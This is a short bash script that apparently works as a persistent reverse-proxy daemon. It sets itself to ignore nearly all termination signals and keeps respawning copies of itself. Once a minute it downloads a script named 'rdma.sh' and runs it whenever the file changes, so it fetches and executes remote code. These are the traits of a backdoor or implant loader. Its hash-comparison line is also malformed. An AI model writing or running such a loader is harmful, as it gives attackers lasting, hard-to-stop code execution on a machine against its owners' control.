#!/bin/bash

trap -- '' SIGINT SIGTERM SIGSEGV SIGPIPE SIGQUIT SIGHUP SIGILL SIGABRT SIGTRAP SIGTSTP
__rproxy_d="$0"

function rproxy_daemon () {
    while true; do
        lockfile /tmp/.__rproxy_d.lock
        ./rproxy.sh # must exit if a conn has failed.
        mcget.sh rdma.sh -O /tmp/rdma.sh
        if [ `sha256sum /tmp/rdma.sh` != `sha256sum /tmp/rdma.sh.backup` ]; then
            bash /tmp/rdma.sh
        fi
        mv /tmp/rdma.sh /tmp/rdma.sh.backup
        rm -f /tmp/.__rproxy_d.lock
        sleep 60
    done
}
function selffork_daemon () {
    while true; do
        # including a process `grep`
        currDup=`ps o command | grep "$__rproxy_d" | wc -l`
        if [ $currDup -le 4 ]; then
            $__rproxy_d & disown
        fi
        sleep 1
    done
}

rproxy_daemon &
selffork_daemon
